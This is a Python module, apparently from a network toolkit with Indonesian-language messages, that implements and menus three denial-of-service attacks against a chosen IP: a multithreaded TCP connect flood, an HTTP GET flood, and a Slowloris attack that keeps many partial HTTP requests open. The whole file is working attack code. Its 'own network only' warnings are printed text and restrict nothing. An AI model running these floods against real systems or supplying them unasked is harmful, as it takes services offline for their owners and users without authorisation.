import socket
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from .utils import (
    info, ok, warn, error, section,
    GREEN, RED, YELLOW, CYAN, RST, BOLD
)


def tcp_connect_flood(target_ip, target_port, duration=10, threads=20):
    section(f"TCP CONNECT FLOOD: {target_ip}:{target_port}")
    warn("STRESS TEST DIMULAI — Pastikan ini jaringan ANDA SENDIRI!")
    warn(f"Target: {target_ip}:{target_port} | Durasi: {duration}s | Threads: {threads}")
    print()

    stop_event = threading.Event()
    connection_count = [0]
    error_count = [0]
    lock = threading.Lock()

    def flood_worker():
        while not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                with lock:
                    connection_count[0] += 1
                time.sleep(0.5)
                sock.close()
            except Exception:
                with lock:
                    error_count[0] += 1
                time.sleep(0.1)

    workers = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    info(f"Flooding ... (tekan Ctrl+C untuk berhenti)")

    try:
        start = time.time()
        while time.time() - start < duration:
            time.sleep(1)
            with lock:
                conns = connection_count[0]
                errs = error_count[0]
            elapsed = int(time.time() - start)
            print(f"  {YELLOW}[{elapsed}s]{RST} Connections: {GREEN}{conns}{RST} | Errors: {RED}{errs}{RST}      ", end="\r")
    except KeyboardInterrupt:
        pass

    stop_event.set()
    for t in workers:
        t.join(timeout=1)

    print()
    ok(f"Stress test selesai. Total koneksi: {connection_count[0]}, Error: {error_count[0]}")


def http_flood(target_url, duration=10, threads=20):
    section(f"HTTP FLOOD: {target_url}")
    warn("STRESS TEST DIMULAI — Pastikan ini jaringan ANDA SENDIRI!")
    warn(f"Target: {target_url} | Durasi: {duration}s | Threads: {threads}")
    print()

    import urllib.request
    import urllib.error

    stop_event = threading.Event()
    request_count = [0]
    error_count = [0]
    lock = threading.Lock()

    def flood_worker():
        while not stop_event.is_set():
            try:
                req = urllib.request.Request(target_url, headers={
                    "User-Agent": "Mozilla/5.0",
                    "Cache-Control": "no-cache",
                })
                urllib.request.urlopen(req, timeout=3)
                with lock:
                    request_count[0] += 1
            except Exception:
                with lock:
                    error_count[0] += 1
                time.sleep(0.05)

    workers = []
    for i in range(threads):
        t = threading.Thread(target=flood_worker)
        t.daemon = True
        t.start()
        workers.append(t)

    info(f"Flooding ... (tekan Ctrl+C untuk berhenti)")

    try:
        start = time.time()
        while time.time() - start < duration:
            time.sleep(1)
            with lock:
                reqs = request_count[0]
                errs = error_count[0]
            elapsed = int(time.time() - start)
            print(f"  {YELLOW}[{elapsed}s]{RST} Requests: {GREEN}{reqs}{RST} | Errors: {RED}{errs}{RST}      ", end="\r")
    except KeyboardInterrupt:
        pass

    stop_event.set()
    for t in workers:
        t.join(timeout=1)

    print()
    ok(f"HTTP flood selesai. Total requests: {request_count[0]}, Error: {error_count[0]}")


def slowloris_attack(target_ip, target_port=80, sockets_count=100, duration=30):
    section(f"SLOWLORIS TEST: {target_ip}:{target_port}")
    warn("Simulasi Slow HTTP Header Attack — Pastikan jaringan ANDA SENDIRI!")
    warn(f"Target: {target_ip}:{target_port} | Sockets: {sockets_count} | Durasi: {duration}s")
    print()

    sockets = []
    info(f"Membuka {sockets_count} koneksi setengah jadi ...")

    for i in range(sockets_count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(f"Host: {target_ip}\r\n".encode())
            sock.send(b"User-Agent: Mozilla/5.0\r\n")
            sock.send(b"Accept: text/html,application/xhtml+xml\r\n")
            sockets.append(sock)
        except Exception:
            pass

    ok(f"{len(sockets)} socket terbuka.")

    interval = 5
    stop_event = threading.Event()
    keepalive_count = [0]

    def keep_alive():
        while not stop_event.is_set():
            for sock in sockets:
                try:
                    sock.send(f"X-KeepAlive: {keepalive_count[0]}\r\n".encode())
                except Exception:
                    pass
            keepalive_count[0] += 1
            time.sleep(interval)

    ka_thread = threading.Thread(target=keep_alive)
    ka_thread.daemon = True
    ka_thread.start()

    info(f"Mengirim keep-alive headers setiap {interval}s ... (tekan Ctrl+C untuk berhenti)")

    try:
        start = time.time()
        while time.time() - start < duration:
            time.sleep(2)
            elapsed = int(time.time() - start)
            active = sum(1 for s in sockets if s.fileno() != -1)
            print(f"  {YELLOW}[{elapsed}s]{RST} Sockets active: {CYAN}{active}{RST} / {len(sockets)}     ", end="\r")
    except KeyboardInterrupt:
        pass

    stop_event.set()
    ka_thread.join(timeout=2)

    for sock in sockets:
        try:
            sock.close()
        except Exception:
            pass

    print()
    ok(f"Slowloris test selesai.")


def stress_menu(ip):
    print(f"\n{BOLD}STRESS TEST MENU{RST}")
    print(f"  Target: {CYAN}{ip}{RST}")
    print()
    print(f"  {YELLOW}1{RST}) TCP Connect Flood (port 80)")
    print(f"  {YELLOW}2{RST}) TCP Connect Flood (custom port)")
    print(f"  {YELLOW}3{RST}) HTTP GET Flood")
    print(f"  {YELLOW}4{RST}) Slowloris Test")
    print(f"  {YELLOW}0{RST}) Kembali")
    print()

    try:
        choice = input(f"{GREEN}Pilih > {RST}").strip()
    except KeyboardInterrupt:
        return

    if choice == "1":
        tcp_connect_flood(ip, 80)
    elif choice == "2":
        try:
            port = int(input(f"  Port: "))
            threads = int(input(f"  Threads (default 20): ") or "20")
            duration = int(input(f"  Durasi detik (default 10): ") or "10")
            tcp_connect_flood(ip, port, duration, threads)
        except ValueError:
            error("Input tidak valid.")
    elif choice == "3":
        url = f"http://{ip}/"
        try:
            threads = int(input(f"  Threads (default 20): ") or "20")
            duration = int(input(f"  Durasi detik (default 10): ") or "10")
            http_flood(url, duration, threads)
        except ValueError:
            error("Input tidak valid.")
    elif choice == "4":
        try:
            port = int(input(f"  Port (default 80): ") or "80")
            sockets = int(input(f"  Sockets (default 100): ") or "100")
            duration = int(input(f"  Durasi detik (default 30): ") or "30")
            slowloris_attack(ip, port, sockets, duration)
        except ValueError:
            error("Input tidak valid.")
